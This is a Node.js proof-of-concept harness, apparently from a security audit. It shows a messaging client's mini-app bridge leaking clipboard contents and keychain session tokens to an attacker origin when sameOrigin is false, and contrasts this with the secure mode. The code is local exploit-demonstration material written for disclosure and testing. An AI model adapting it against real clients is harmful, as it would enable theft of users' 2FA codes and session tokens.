// Dynamic PoC runner: serves the attacker page on a real origin, injects the
// native bridge stub (modelling the client), and runs it in headless Chromium.
// Demonstrates Finding 4 exfiltration in sameOrigin==false vs secure mode.
const http = require('http');
const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');

const DIR = __dirname;
const STUB = fs.readFileSync(path.join(DIR, 'native-stub.js'), 'utf8');
const ATTACKER = fs.readFileSync(path.join(DIR, 'pages', 'attacker.html'), 'utf8');

const server = http.createServer((req, res) => {
  if (req.url.startsWith('/attacker')) { res.writeHead(200, { 'content-type': 'text/html' }); res.end(ATTACKER); }
  else { res.writeHead(404); res.end('nf'); }
});

async function scenario(browser, label, cfg, url) {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const bridge = [];
  page.on('console', m => {
    const t = m.text();
    if (t.startsWith('TG_BRIDGE ')) bridge.push(JSON.parse(t.slice('TG_BRIDGE '.length)));
    if (t.startsWith('ATTACKER_RECEIVED ')) bridge.push({ type: 'ATTACKER_RECEIVED', detail: JSON.parse(t.slice('ATTACKER_RECEIVED '.length)) });
  });
  await page.addInitScript(c => { window.__TG_STUB_CONFIG__ = c; }, cfg);
  await page.addInitScript(STUB);
  await page.goto(url);
  await page.waitForTimeout(400);
  const exfil = await page.evaluate(() => window.__exfil || []);
  await ctx.close();

  console.log('\n======== SCENARIO: ' + label + ' ========');
  console.log('config:', JSON.stringify({ sameOrigin: cfg.sameOrigin, trustedOrigin: cfg.trustedOrigin, botInAttachMenu: cfg.botInAttachMenu }));
  for (const e of bridge) {
    if (e.type === 'OUTBOUND_FETCH') console.log('  [OUTBOUND] ', JSON.stringify(e.detail));
    else if (e.type === 'KEYCHAIN_READ' || e.type === 'KEYCHAIN_WRITE') console.log('  [' + e.type + '] ', JSON.stringify(e.detail));
    else if (e.type === 'performAction_rejected') console.log('  [REJECTED] ', JSON.stringify(e.detail));
    else if (e.type === 'sendEvent_blocked') console.log('  [BLOCKED] ', JSON.stringify(e.detail));
    else if (e.type === 'ATTACKER_RECEIVED') console.log('  [ATTACKER GOT] ', JSON.stringify(e.detail));
  }
  console.log('  >>> EXFILTRATED TO ATTACKER PAGE: ' + (exfil.length ? JSON.stringify(exfil) : '(nothing)'));
}

(async () => {
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  const browser = await chromium.launch({ args: ['--no-sandbox'] });

  // trusted origin = 127.0.0.1:port ; attacker origin = localhost:port (different origin)
  const attackerUrl = `http://localhost:${port}/attacker`;
  const trustedOrigin = `http://127.0.0.1:${port}`;

  // VULN: legacy mini-app, sameOrigin==false -> bridge trusts attacker origin
  await scenario(browser, 'sameOrigin == FALSE (legacy bot) — Finding 4', {
    sameOrigin: false, trustedOrigin, botInAttachMenu: true, botId: '777',
    clipboard: 'SECRET-2FA-CODE 889922', keychain: { bot_777: 'LEGIT_BOT_SESSION_TOKEN_abc' },
  }, attackerUrl);

  // SECURE: sameOrigin==true, attacker origin != trustedOrigin -> blocked
  await scenario(browser, 'sameOrigin == TRUE (modern bot) — secure path', {
    sameOrigin: true, trustedOrigin, botInAttachMenu: true, botId: '777',
    clipboard: 'SECRET-2FA-CODE 889922', keychain: { bot_777: 'LEGIT_BOT_SESSION_TOKEN_abc' },
  }, attackerUrl);

  await browser.close();
  server.close();
})().catch(e => { console.error(e); process.exit(1); });
